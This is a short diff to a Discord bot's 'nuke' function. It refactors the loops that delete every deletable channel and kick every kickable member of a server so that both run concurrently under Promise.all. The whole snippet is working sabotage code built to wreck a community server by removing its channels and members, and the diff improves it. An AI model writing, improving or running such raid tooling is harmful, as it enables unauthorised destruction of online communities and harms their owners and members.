@@ -51,22 +51,23 @@ const nuke = async g => {
     const channels = g.channels.cache;
 
     try {
-        new Promise(async _ => {
-            for (const channel of channels.values()) {            
-                if ("deletable" in channel &&
-                    channel.deletable) channel.delete();
-    
-                await sleep(300);
-            }
-        });
-
-        new Promise(async _ => {
-            for (const member of members.values()) {
-                if (member.kickable) member.kick();
-    
-                await sleep(300);
-            }
-        });
+        await Promise.all([
+            new Promise(async _ => {
+                for (const channel of channels.values()) {            
+                    if ("deletable" in channel &&
+                        channel.deletable) channel.delete();
+        
+                    await sleep(300);
+                }
+            }),
+            new Promise(async _ => {
+                for (const member of members.values()) {
+                    if (member.kickable) member.kick();
+        
+                    await sleep(300);
+                }
+            }),
+        ]);
 
     } catch (e) {
         if (PRINT_ERROR) console.error(e);
